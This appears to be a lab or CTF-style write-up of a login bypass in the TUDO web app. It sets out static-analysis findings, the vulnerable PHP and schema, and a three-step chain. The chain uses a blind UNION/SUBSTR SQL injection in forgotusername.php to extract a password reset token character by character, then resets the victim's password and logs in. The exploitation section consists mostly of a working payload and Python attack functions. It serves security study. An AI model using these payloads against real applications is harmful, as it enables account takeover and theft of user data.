# Login Bypass

## Overview

Login bypass vulnerabilities allow attackers to gain unauthorized access to an application without providing valid credentials. This can be achieved through various techniques, such as SQL injection, weak authentication mechanisms, or exploiting logic flaws in the login process. In the case of TUDO, we identified a potential login bypass vulnerability that could allow an attacker to access user accounts without proper authentication. This vulnerability is particularly critical as it can lead to unauthorized access to sensitive user data and potentially allow attackers to perform actions on behalf of the compromised user.

## Static Analysis

Static analysis was performed using **ProgPilot**, which identified two vulnerabilities that are relevant to the login pipeline:

```json
[
  {
    "source_name": ["$username"],
    "source_line": [9],
    "source_column": [219],
    "source_file": ["\/workspace\/forgotusername.php"],
    "sink_name": "pg_query",
    "sink_line": 12,
    "sink_column": 311,
    "sink_file": "\/workspace\/forgotusername.php",
    "vuln_name": "sql_injection",
    "vuln_cwe": "CWE_89",
    "vuln_id": "2b23136e94bac002cf0463d4d4cc542ebff3606cd8ec7b0ec0380f5b292924d9",
    "vuln_type": "taint-style"
  },
  {
    "source_name": ["$_GET[\"token\"]"],
    "source_line": [77],
    "source_column": [2766],
    "source_file": ["\/workspace\/resetpassword.php"],
    "sink_name": "echo",
    "sink_line": 77,
    "sink_column": 2766,
    "sink_file": "\/workspace\/resetpassword.php",
    "vuln_name": "xss",
    "vuln_cwe": "CWE_79",
    "vuln_id": "d0adfe74035dd960628ccbe2a1f858038b5203291ce0ac943e61ce9ade57042b",
    "vuln_type": "taint-style"
  }
]
```

## Information Gathering

To build a successful exploit, we analyzed the application's internal structure using the **utils.php** and **init.sql.sql** files.

### Key Findings

* **Vulnerability:** Static analysis identified a critical SQL Injection sink in **forgotusername.php** where the **$username** POST parameter is concatenated directly into a query. Lack of input sanitization allows attackers to manipulate the query, potentially bypassing authentication or extracting sensitive data. Query requires exactly one matching row to succeed. If the query is successful it renders `User exists!` otherwise `User doesn't exist.`"

    ```php
    $username = $_POST['username'];

    include('includes/db_connect.php');
    $ret = pg_query($db, "select * from users where username='".$username."';");

    if (pg_num_rows($ret) === 1) {
        $success = true;
    } else {
        $error = true;
    }
    ```

    ```php
    <?php if (isset($error)){echo "<span style='color:red'>User doesn't exist.</span>";}
    else if (isset($success)){echo "<span style='color:green'>User exists!</span>";} ?>
    ```

* **Database Schema:** The **init.sql** file defines the **tokens** table which links a **uid** (user ID) to a **token** string.

    ```sql
    CREATE TABLE users (
        uid SERIAL PRIMARY KEY NOT NULL,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        description TEXT
    );

    CREATE TABLE tokens (
        tid SERIAL PRIMARY KEY NOT NULL,
        uid INT NOT NULL,
        token TEXT NOT NULL,
        FOREIGN KEY (uid) REFERENCES users (uid)
    );
    ```

* **Token Generation:** The **generateToken()** function in **utils.php** uses a specific charset and token length of 32 characters.

    ```php
    function generateToken() {
            srand(round(microtime(true) * 1000));
            $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
            $ret = '';
            for ($i = 0; $i < 32; $i++) {
                $ret .= $chars[rand(0,strlen($chars)-1)];
            }
            return $ret;
        }
    ```

## Exploitation

The attack follows a three-stage "chain" to execute the login bypass.

### Preconditions

We need to request a password reset for the target user to generate a valid token in the database. This is done via the **forgotusername.php** endpoint, which also serves as our initial attack vector for SQL Injection.

### Step 1: Exploiting the SQL Injection

The **forgotusername.php** script returns `User exists!` if the database query returns exactly one row.
Because of this, we used a **UNION SELECT** payload to return exactly one row only when a specific character in the reset token is guessed correctly.

```sql
UNION
SELECT uid, username, password, description
FROM users WHERE username='<username>' 
AND SUBSTR((SELECT token
            FROM tokens
            WHERE uid=(SELECT uid FROM users WHERE username='<username>')
            ORDER BY tid DESC LIMIT 1), {i}, 1)='<char>'
-- 
```

Using this payload, we iteratively extracted each character of the 32-character token by checking all possible characters until we found a match that returned `User exists!`

```python
def extract_pwd_reset_token(username):
    token = ""
    
    for i in range(1, 33):
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
            payload = (
                f"' UNION SELECT uid, username, password, description FROM users "
                f"WHERE username='{username}' "
                f"AND SUBSTR((SELECT token FROM tokens WHERE uid=(SELECT uid FROM users WHERE username='{username}') ORDER BY tid DESC LIMIT 1), {i}, 1)='{char}' -- "
            )
                        
            resp = session.post(f"{BASE_URL}/forgotusername.php", data={"username": payload})

            if "User exists!" in resp.text:
                token += char

            
    return token if token else None
```

### Step 2: Password Reset

We submitted the stolen token to **resetpassword.php**, which allows setting a new password for the associated user.

```python
def reset_password(token, new_password):        
        data = {
            "token": token,
            "password1": new_password,
            "password2": new_password
        }
        
        resp = session.post(f"{BASE_URL}/resetpassword.php", data=data)
        
        if "Password changed!" in resp.text:
            return True
        else:
            return False
```

### Step 3: Final Authentication Bypass

With the password changed, we proceeded to **login.php**.

```python
def login(username, password):
    data = {
        "username": username,
        "password": password
    }

    resp = session.post(f"{BASE_URL}/login.php", data=data)
    if f"Hello, {username}!" in resp.text:
        return True
    else:
        return False
```

---

## 3. Automated Exploit Script

Full login bypass script can be found in [**login_bypass.py**](./login_bypass.py). It automates the entire process of token extraction, password reset, and final login.

---
